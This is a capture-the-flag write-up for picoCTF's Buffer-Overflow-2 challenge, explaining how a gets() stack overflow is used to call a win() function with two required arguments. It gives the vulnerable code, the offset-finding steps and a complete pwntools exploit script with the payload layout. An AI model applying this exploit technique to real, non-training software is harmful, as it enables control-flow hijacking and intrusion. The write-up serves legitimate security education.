# Buffer-Overflow-2 Writeup

**Flag:** `picoCTF{...}`

---

## Summary

This is the sequel to the first buffer overflow. Same story: `gets()` lets us smash the stack, but this time the target function `win()` is pickier — it takes **two arguments** and only prints the flag if they’re correct.

So the exploit flow is:

1. Overflow buffer until we control EIP.
2. Redirect execution to `win()`.
3. Fake a return address (back to `main`) so the program doesn’t crash.
4. Push the two required arguments (`0xCAFEF00D` and `0xF00DF00D`) onto the stack.

---

## Vulnerability

Here’s the vulnerable code:

```c
void vuln(){
  char buf[BUFSIZE];      // BUFSIZE = 100
  gets(buf);              // classic unsafe input
  puts(buf);
}
```

No bounds checking = stack smash.

And the `win()` function checks arguments before printing the flag:

```c
if (arg1 != 0xCAFEF00D) return;
if (arg2 != 0xF00DF00D) return;
printf(buf);
```

So just overwriting EIP isn’t enough — we also need to pass arguments correctly.

---

## Finding the Offset

Use a cyclic pattern of 1024 bytes:

```
pattern create 1024
```

Crash the program, grab EIP, and check the offset:

```
pattern offset <EIP>
```

This gives **112 bytes**.

Why 112 and not \~100? GCC aligns the stack to **16-byte boundaries** under the cdecl calling convention. The extra padding explains the offset.

---

## Exploit Strategy

We build a payload that looks like this:

```
[112 bytes padding]  
[addr of win()]  
[addr of main()]   <- return address after win()  
[arg1 = 0xCAFEF00D]  
[arg2 = 0xF00DF00D]  
```

Python exploit:

```python
from pwn import *

def exploit(conn):
    elf = ELF("./vuln")
    win = elf.symbols["win"]
    main = elf.symbols["main"]

    payload  = b"A" * 112
    payload += p32(win)
    payload += p32(main)
    payload += p32(0xCAFEF00D)
    payload += p32(0xF00DF00D)

    conn.sendline(payload)
    conn.interactive()
```

---

## Final Notes

* Same vuln (`gets()`) but more realistic — now you have to handle args + return flow.
* EIP offset = **112** because of stack alignment.
* Exploit is just a clean ret2win with arguments.
